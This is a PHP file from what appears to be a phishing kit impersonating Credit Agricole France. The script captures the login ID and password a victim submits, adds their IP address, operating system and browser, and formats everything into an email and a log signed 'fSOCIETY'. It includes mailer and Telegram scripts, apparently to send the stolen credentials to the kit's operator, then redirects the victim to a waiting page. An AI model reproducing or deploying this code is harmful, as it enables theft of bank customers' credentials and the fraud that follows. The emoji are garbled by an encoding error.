<?php

session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$identifiant = $_SESSION['identifiant'] = $_POST['identifiant'];
$password = $_SESSION['password'] = $_POST['password'];

$msgbank = '
<html><head>

</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Log Credit Agricole Fr β '.$_SERVER['REMOTE_ADDR'].'β By fSOCIETY ππ€‘π </h2>

<h1>π€ identifiant    : <span> '.$_SESSION["identifiant"].' </span>  </h1>
<h1>π Password    : <span>  '.$_SESSION["password"].' </span> </h1>
<hr class="content"><h2>π» System : <span>  '.$OS.' </span>  </h2>
<h2>π BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>π IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/FR/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>β° TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';



$yagmai .= '
[π identifiant ] = '.$_SESSION['identifiant'].'
[π Password ] = '.$_SESSION['password'].'
    [+]ββββγπ» Systemγβββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


$yagmail .= '
[+]βββββββββββββγCredit Agricoleγββββββββββββββββββ[+]
[+]ββββββββββββββββββγπLoginγββββββββββββββββββββ[+]
[π identifiant ] = '.$_SESSION['identifiant'].'
[π Password ] = '.$_SESSION['password'].'
[+]=ββββββββββββββββββγπ» Systemγβββββββββββββββββ[+]
[π IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[β° TIME/DATE] ='.$InfoDATE.'
[π BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]ββββββββββββββγCredit Agricole γββββββββββββββββββ[+]
[+]ββββββββββββββγSAMM FULL REZπ€‘πγβββββββββββββββ[+]
';


include("sand_email.php"); 
include("TelegramApi.php"); 


$src="../Wait_forte.php";
header("location:$src");

?>